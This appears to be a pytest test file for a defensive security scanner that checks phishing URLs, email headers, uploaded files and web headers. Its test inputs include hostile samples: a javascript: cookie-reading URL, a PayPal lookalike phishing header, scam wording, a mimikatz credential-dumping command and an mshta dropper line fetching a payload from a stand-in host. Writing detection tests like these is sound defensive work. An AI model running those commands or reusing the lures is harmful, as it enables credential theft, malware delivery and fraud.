"""Remediation coverage: every finding must ship a concrete suggested
fix, and the v1.3 detection additions must fire."""

from app.modules.email_analyzer import analyze_email
from app.modules.file_scanner import EICAR_SIGNATURE, scan_file
from app.modules.url_analyzer import analyze_url
from app.modules.web_audit import audit_headers

PHISH_HEADERS = (
    'From: "PayPal Support" <support@paypa1-secure.xyz>\n'
    "Reply-To: help@totally-different.ru\n"
    "Authentication-Results: mx.example.com; spf=fail dkim=fail dmarc=fail"
)


def _assert_all_fixed(findings):
    assert findings, "expected at least one finding"
    for f in findings:
        assert f.get("fix"), f"finding {f['code']} has no suggested fix"
        assert len(f["fix"]) > 20


def test_every_engine_finding_has_a_fix():
    _assert_all_fixed(analyze_url("http://192.168.10.5/paypal/login/verify").findings)
    _assert_all_fixed(analyze_url("https://www.google.com").findings)
    _assert_all_fixed(analyze_email(PHISH_HEADERS, "Urgent! Confirm your password and enter your OTP.")["findings"])
    _assert_all_fixed(scan_file("invoice.pdf", b"MZ" + b"\x00" * 300)["findings"])
    _assert_all_fixed(scan_file("notes.txt", b"hello world")["findings"])
    _assert_all_fixed(audit_headers("http://x.com", {}, [], https=False)["findings"])
    _assert_all_fixed(audit_headers("https://x.com", {"Strict-Transport-Security": "max-age=1"}, [], https=True)["findings"])


def test_dangerous_scheme_detected():
    r = analyze_url("javascript:alert(document.cookie)")
    assert any(f["code"] == "dangerous-scheme" for f in r.findings)
    assert r.risk_score >= 35


def test_obfuscated_ip_detected():
    for host in ("2130706433", "0x7f000001", "0177.0.0.1"):
        r = analyze_url(f"http://{host}/login")
        assert any(f["code"] == "obfuscated-ip" for f in r.findings), host


def test_executable_and_redirect_detections():
    r = analyze_url("https://files.example.net/update.exe")
    assert any(f["code"] == "executable-download" for f in r.findings)
    r = analyze_url("https://good.example.com/login?next=https://evil.example.org/phish")
    assert any(f["code"] == "redirect-param" for f in r.findings)


def test_bec_and_giftcard_language():
    r = analyze_email("", "Please process this wire transfer today and keep this confidential.")
    assert any(f["code"] == "bec-wire" for f in r["findings"])
    r = analyze_email("", "Buy gift cards worth $500 and send me the codes.")
    assert any(f["code"] == "giftcard-scam" for f in r["findings"])


def test_new_file_iocs_and_eicar():
    r = scan_file("tool.txt", b"run mimikatz sekurlsa::logonpasswords now")
    assert any(f["code"] == "credential-theft" for f in r["findings"])
    r = scan_file("page.hta", b"mshta https://evil.example.org/payload")
    assert any(f["code"] == "mshta-dropper" for f in r["findings"])
    r = scan_file("eicar.com", EICAR_SIGNATURE)
    assert any(f["code"] == "eicar-test" for f in r["findings"])
    assert r["verdict"] == "clean"


def test_web_audit_info_findings():
    headers = {"X-Powered-By": "PHP/8.1.2", "Access-Control-Allow-Origin": "*"}
    r = audit_headers("https://x.com", headers, [], https=True)
    codes = {f["code"] for f in r["findings"]}
    assert {"x-powered-by", "cors-wildcard", "cache-control"} <= codes
    _assert_all_fixed(r["findings"])
